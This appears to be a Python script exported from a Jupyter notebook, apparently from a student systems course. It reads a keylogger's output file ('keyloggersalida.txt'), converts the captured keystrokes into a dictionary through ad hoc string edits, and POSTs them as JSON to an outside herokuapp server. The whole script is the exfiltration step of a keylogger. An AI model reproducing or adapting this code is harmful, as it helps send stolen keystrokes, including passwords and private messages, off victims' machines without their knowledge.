#!/usr/bin/env python
# coding: utf-8

# In[14]:


#conda install -c anaconda openssl


# In[68]:


import json
import urllib.request


# In[69]:


with open("keyloggersalida.txt", encoding="utf8", errors='ignore') as f:
  contents = f.read()
  f.close()


# In[70]:


datos=contents


# In[71]:


#datos=contents.decode()


# In[72]:


datos_=datos.split("\r")


# In[73]:


str(datos_)


# In[74]:


datos__=str(datos_).replace("'", "").replace("\\n", "")


# In[75]:


datos___='{'+datos__[1:-3]+'}'+str(']')+'}'


# In[76]:


datos___


# In[77]:


import ast


# In[78]:


datos____=ast.literal_eval(datos___)


# In[79]:


datos____["keys"]


# In[80]:


import json      

body =  datos____

myurl = "https://sistemasop-fiis.herokuapp.com/test"
req = urllib.request.Request(myurl)
req.add_header('Content-Type', 'application/json; charset=utf-8')
jsondata = json.dumps(body)
jsondataasbytes = jsondata.encode('utf-8')   # needs to be bytes
req.add_header('Content-Length', len(jsondataasbytes))
print (jsondataasbytes)
response = urllib.request.urlopen(req, jsondataasbytes)


# In[ ]:





# In[ ]:




